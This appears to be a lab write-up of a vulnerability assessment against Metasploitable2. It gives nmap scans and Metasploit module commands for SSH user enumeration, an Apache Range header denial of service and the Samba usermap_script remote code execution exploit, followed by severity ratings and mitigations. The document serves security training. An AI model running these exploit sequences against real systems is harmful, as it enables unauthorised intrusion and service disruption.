# Vulnerability Assessment — Metasploitable2 (SSH, HTTP, SMB)

**Project**: Vulnerability Assessment of a Test Network — Metasploitable2
---

## Overview

The assessment focused on three representative services:

* **SSH (port 22)** — OpenSSH user enumeration / weak authentication (e.g., OpenSSH 4.7p1 issues).
* **HTTP (port 80)** — Apache Range header DoS (CVE-2011-3192).
* **SMB (port 445)** — Samba usermap script command execution (CVE-2007-2447).

The goal: discover, (controlled) exploit, document evidence, recommend mitigations, and run an incident-response simulation — all within an isolated virtual lab.

---

---

## Prerequisites (lab)

* Host: Kali Linux (attacker).
* Target: Metasploitable2 .
* Optional: Wireshark for PCAP capture, Nessus/OpenVAS for vulnerability scanning, Metasploit Framework.

---

## Quick-start: Commands used 

> Discover host and services

```bash
nmap -sn 192.168.56.0/24
nmap -sV -p 22,80,445 192.168.56.101 -oN nmap_services.txt
```

> SSH enumeration (Metasploit aux)

```text
msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.56.101
run
```

> Apache Range header DoS (proof-of-concept)

```text
use auxiliary/dos/http/apache_range_dos
set RHOSTS 192.168.56.101
exploit
```

> Samba usermap script exploit

```text
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
exploit
```

---

## Findings & Severity

* **SMB (Samba usermap script)** — Critical / High (remote code execution possible).
* **HTTP (Apache Range DoS)** — High (service disruption).
* **SSH (OpenSSH user enumeration / weak auth)** — Medium (information disclosure & brute-force risk).

---

## Mitigations & Recommendations (summary)

* Patch/upgrade OpenSSH, Apache, and Samba to patched versions.
* Use **key-based authentication** and rate-limiting / fail2ban for SSH.
* Enable WAF / mod_security and limit header parsing for Apache.
* Restrict SMB exposure via firewall rules, disable unused shares, and apply least privilege.
* Maintain regular vulnerability scans and keep host snapshots/backups.
